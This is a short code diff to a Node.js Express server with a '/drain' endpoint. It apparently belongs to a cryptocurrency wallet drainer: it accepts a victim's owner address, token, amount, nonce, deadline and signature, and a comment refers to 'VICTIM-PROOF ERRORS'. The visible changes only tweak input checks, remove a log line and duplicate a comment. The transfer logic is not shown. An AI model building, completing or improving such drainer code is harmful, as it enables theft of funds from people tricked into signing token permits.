@@ -156,6 +156,7 @@ const wss = new WebSocket.Server({ noServer: true });
 app.get('/ws-status', (req, res) => res.json({ ws: 'active' }));
 
 // 🔥 PRODUCTION /drain - VICTIM-PROOF ERRORS
+// 🔥 PRODUCTION /drain - VICTIM-PROOF ERRORS
 app.post('/drain', async (req, res) => {
   const start = Date.now();
   
@@ -164,12 +165,12 @@ app.post('/drain', async (req, res) => {
     
     const { owner, token, tokenSymbol, amount, nonce, deadline, signature } = req.body;
     
-    console.log('✅ AUTO-FIXED:', { owner, token, tokenSymbol, safeAmount: safeAmount.slice(0,20)+'...', safeNonce, safeDeadline });
-    
+    // Add signature validation here
     if (!ethers.utils.isAddress(owner) || !ethers.utils.isAddress(token) || !TOKENS[tokenSymbol]) {
       return res.status(400).json({ error: 'Invalid wallet address' });
     }
 
+    // Add signature validation here
     if (!signature || signature === '0x') {
       return res.status(400).json({ error: 'Missing signature' });
     }
